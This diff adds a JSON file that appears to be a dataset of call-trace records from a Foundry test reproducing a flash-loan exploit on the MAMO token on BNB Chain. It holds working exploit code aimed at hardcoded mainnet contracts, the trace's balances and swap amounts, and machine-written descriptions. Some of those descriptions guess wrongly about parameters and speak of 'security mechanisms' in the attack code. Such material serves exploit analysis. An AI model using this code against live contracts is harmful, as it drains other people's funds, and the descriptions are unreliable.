@@ -1,0 +1,247 @@
+[
+    {
+        "id": "404124",
+        "args": "",
+        "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Begin] Attacker WBNB before exploit\", wbnb.balanceOf(address(this)), 18);\n        emit log_named_uint(\"[Begin] Attacker MAMO before exploit\", MAMO.balanceOf(address(this)));\n        address me = address(this);\n        dvm.flashLoan(0, 19_000_000_000_000_000_000, me, \"0x21\");\n        emit log_named_decimal_uint(\"[End] Attacker WBNB after exploit\", wbnb.balanceOf(address(this)), 18);\n        emit log_named_uint(\"[End] Attacker MAMO after exploit\", MAMO.balanceOf(address(this)));\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `testExploit` function is designed to simulate or execute an exploit scenario. It starts by logging the attacker's balance of two tokens (WBNB and MAMO) before the exploit. Then, it initiates a flash loan, which is a type of loan that must be borrowed and repaid within the same transaction. After the flash loan, it logs the attacker's balance of the same tokens again to show the changes caused by the exploit.\n\n2. **Security mechanism**:  \n   The function does not explicitly include security mechanisms like access control or input validation. However, it uses `external` visibility, meaning it can only be called from outside the contract. The function relies on the security of the `dvm.flashLoan` function, which is assumed to handle the flash loan logic safely. Additionally, the use of `emit` statements for logging helps in monitoring and debugging the exploit process.\n\n3. **Parameter Function**:  \n   The `dvm.flashLoan` function takes four parameters:  \n   - `0`: Likely represents the amount of the loan (in this case, 0, which might indicate a placeholder or a specific use case).  \n   - `19_000_000_000_000_000_000`: Represents another value, possibly the maximum loan amount or a specific identifier.  \n   - `me`: The address of the caller (the attacker's contract).  \n   - `\"0x21\"`: A data parameter, possibly used to pass additional instructions or context for the flash loan.  \n\n4. **Return description**:  \n   The function does not return any value. Instead, it uses `emit` statements to log the attacker's token balances before and after the exploit. These logs help in understanding the impact of the exploit by showing the changes in the attacker's holdings of WBNB and MAMO tokens.  \n\n**In summary**,  \nThe `testExploit` function simulates an exploit by logging token balances, executing a flash loan, and then logging the balances again to show the effects. It relies on the `dvm.flashLoan` function for the exploit logic and uses logging to track changes. The function does not include explicit security measures but assumes the flash loan mechanism is secure.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13474",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "355120",
+        "args": "0, 19000000000000000000 [1.9e19], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x30783231",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "352421",
+        "args": "0, 19000000000000000000 [1.9e19], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x30783231",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "27962",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19000000000000000000 [1.9e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "298046",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 19000000000000000000 [1.9e19], 0x30783231",
+        "original_code": "    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes memory data) public {\n        wbnb.withdraw(quoteAmount);\n\n        address buyTokenContractAddress = 0xa915Bb6D5C117fB95E9ac2edDaE68AAd5EdB5841;\n        (bool successBuyToken,) = buyTokenContractAddress.call{value: quoteAmount}(\n            abi.encodeWithSignature(\"BuyToken(address)\", 0x5813d7818c9d8F29A9a96B00031ef576E892DEf4)\n        ); // attacker contract gained 95,000,000 MAMO\n        require(successBuyToken, \"BuyToken failed\");\n\n        (uint256 _amount0, uint256 _amount1,) = pair.getReserves();\n        uint256 amount_out = router.getAmountOut(9_500_000_000_000_000_000_000_000, _amount0, _amount1);\n        pair.swap(0, amount_out, address(this), \"\");\n\n        uint256 usdtBalance = usdt.balanceOf(address(this));\n        usdt.approve(address(router), usdtBalance);\n\n        address[] memory path = new address[](2);\n        path[0] = usdtAddress;\n        path[1] = address(wbnb);\n        uint256[] memory amounts =\n            router.swapExactTokensForTokens(usdtBalance, 0, path, address(this), block.timestamp + 60);\n\n        wbnb.transfer(address(dvm), 19_000_000_000_000_000_000); //payback\n    }\n\n",
+        "description": "1. Core functions:  \nThis function is designed to perform a series of transactions involving cryptocurrency tokens. It starts by withdrawing a specific amount of a token (WBNB) and then uses that amount to buy another token (MAMO) from a specific contract. After acquiring the token, it calculates the optimal amount to swap using a decentralized exchange (DEX) and executes the swap. Finally, it transfers a portion of the tokens back to repay a loan or fulfill an obligation.\n\n2. Security mechanism:  \nThe function includes a `require` statement to ensure that the token purchase transaction is successful, which acts as a basic safety check. However, there are no additional security measures like access control or reentrancy guards, which could make the function vulnerable to attacks if not used carefully. The function also relies on external contracts (e.g., `wbnb`, `pair`, `router`), so its security depends on the integrity of those contracts.\n\n3. Parameter Function:  \n- `sender`: The address initiating the transaction, though it is not used in the function.  \n- `baseAmount`: The amount of the base token involved in the transaction, though it is not used in the function.  \n- `quoteAmount`: The amount of the quote token (WBNB) to be withdrawn and used for buying another token.  \n- `data`: Additional data passed to the function, though it is not used in the function.  \n\n4. Return description:  \nThe function does not return any value directly. Instead, it performs a series of transactions: withdrawing tokens, buying another token, swapping tokens on a DEX, and transferring tokens to repay a loan. The success of these operations is determined by the `require` statement and the outcomes of the external contract calls.\n\nIn summary,  \nThis function automates a sequence of token transactions, including withdrawal, purchase, swapping, and repayment. It lacks robust security measures, relying on external contracts and a basic `require` check. The parameters provide input for the transactions, but the function does not return any value, focusing instead on executing the operations.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "9181",
+        "args": "19000000000000000000 [1.9e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "83541",
+        "args": "0x5813d7818c9d8F29A9a96B00031ef576E892DEf4",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "33322",
+        "args": "0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000004e950851be0c2ebf0000000000000000000000000000000000000000000000000000000000000000000002",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "26500",
+        "args": "0000000000000000000000005813d7818c9d8f29a9a96b00031ef576e892def400000000000000000000000000000000000000000007dbb4082c9ad1798000000000000000000000000000000000000000000000000000000000000000000001",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "0",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "30503694129561858470407619 [3.05e25], 23976626623894851541714 [2.397e22], 1701763277 [1.701e9]"
+    },
+    {
+        "id": "1021",
+        "args": "9500000000000000000000000 [9.5e24], 30503694129561858470407619 [3.05e25], 23976626623894851541714 [2.397e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "5683062170081466106194 [5.683e21]"
+    },
+    {
+        "id": "60688",
+        "args": "0, 5683062170081466106194 [5.683e21], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "12871",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5683062170081466106194 [5.683e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "11474",
+        "args": "0x5813d7818c9d8F29A9a96B00031ef576E892DEf4",
+        "original_code": null,
+        "description": null,
+        "return_value": "40003694129561858470407619 [4e25]"
+    },
+    {
+        "id": "531",
+        "args": "0x5813d7818c9d8F29A9a96B00031ef576E892DEf4",
+        "original_code": null,
+        "description": null,
+        "return_value": "18293564453813385435520 [1.829e22]"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "5709572170081466106194 [5.709e21]"
+    },
+    {
+        "id": "24562",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 5709572170081466106194 [5.709e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "76471",
+        "args": "5709572170081466106194 [5.709e21], 0, [0x55d398326f99059fF775485246999027B3197955, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1701763593 [1.701e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[5709572170081466106194 [5.709e21], 24795775424049180160 [2.479e19]]"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "17609022825996366074530085 [1.76e25], 76689679168205659977356 [7.668e22], 1701763533 [1.701e9]"
+    },
+    {
+        "id": "10834",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 5709572170081466106194 [5.709e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "51855",
+        "args": "0, 24795775424049180160 [2.479e19], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "27962",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24795775424049180160 [2.479e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE",
+        "original_code": null,
+        "description": null,
+        "return_value": "17614732398166447540636279 [1.761e25]"
+    },
+    {
+        "id": "534",
+        "args": "0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE",
+        "original_code": null,
+        "description": null,
+        "return_value": "76664883392781610797196 [7.666e22]"
+    },
+    {
+        "id": "3262",
+        "args": "0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7, 19000000000000000000 [1.9e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2487",
+        "args": "0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7",
+        "original_code": null,
+        "description": null,
+        "return_value": "323831899377336597818996 [3.238e23]"
+    },
+    {
+        "id": "534",
+        "args": "0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7",
+        "original_code": null,
+        "description": null,
+        "return_value": "174839942849600995634 [1.748e20]"
+    },
+    {
+        "id": "487",
+        "args": "0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7",
+        "original_code": null,
+        "description": null,
+        "return_value": "323831899377336597818996 [3.238e23]"
+    },
+    {
+        "id": "534",
+        "args": "0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7",
+        "original_code": null,
+        "description": null,
+        "return_value": "174839942849600995634 [1.748e20]"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "5795775424049180160 [5.795e18]"
+    },
+    {
+        "id": "3474",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "95000000000000000000000000 [9.5e25]"
+    }
+]
